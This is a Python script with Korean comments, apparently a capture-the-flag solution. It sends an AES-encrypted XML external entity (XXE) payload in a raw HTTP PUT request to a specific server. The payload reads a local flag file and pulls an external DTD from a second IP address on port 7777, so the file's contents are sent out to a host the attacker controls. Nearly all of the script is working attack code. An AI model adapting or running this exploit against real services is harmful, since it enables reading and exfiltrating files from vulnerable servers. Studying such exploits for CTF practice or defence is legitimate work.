import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
import base64 

key = '1234567890123456'    
iv = '1234567890123456'    

def decrypt(data):
    global key, iv
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
    return decrypted_data.decode('utf-8')

def encrypt(data):
    global key, iv
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
    padded_data = pad(data.encode(), AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    encoded = base64.urlsafe_b64encode(encrypted).decode('utf-8').rstrip('=')
    return encoded

# sock 함수
def sock(host, port, message):
    global key, iv
    try:
        # 서버에 소켓 연결
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, int(port)))
            
            s.sendall(message.encode())

            response = b""
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                response += chunk
            
            response_str = response.decode('utf-8')
            print(response_str)

    except Exception as e:
        print(f"Error: {e}")
        return None

host = '43.203.207.195'  
port = '10002'     

body = '<!DOCTYPE data ['
body += '<!ENTITY % file SYSTEM "file:///flag1423749465164">'
body += '<!ENTITY % dtd SYSTEM "http://43.201.250.246:7777/ex.dtd">' 
body += '%dtd;' 
body += ']>'
body += '<data>&exfil;</data>' 

enc_body = encrypt(body)

payload = 'PUT /fsalke2j9sdfcjlz/yQOIIWf3PzTrvh0NdUByunaZZCGTYA HTTP/1.1\r\n'
payload += 'Host: 43.203.207.195\r\n'  # 서버로 보낼 메시지
payload += 'Cookie: myapp=myapp\r\n'
payload += 'Content-Type: application/xml\r\n'
payload += 'Content-Length: ' + str(len(enc_body)) + '\r\n' 
payload += 'Connection: close\r\n\r\n'
payload += enc_body

response = sock(host, port, payload)
if response:
    print("Received data:", response)
else:
    print("No response or error occurred.")
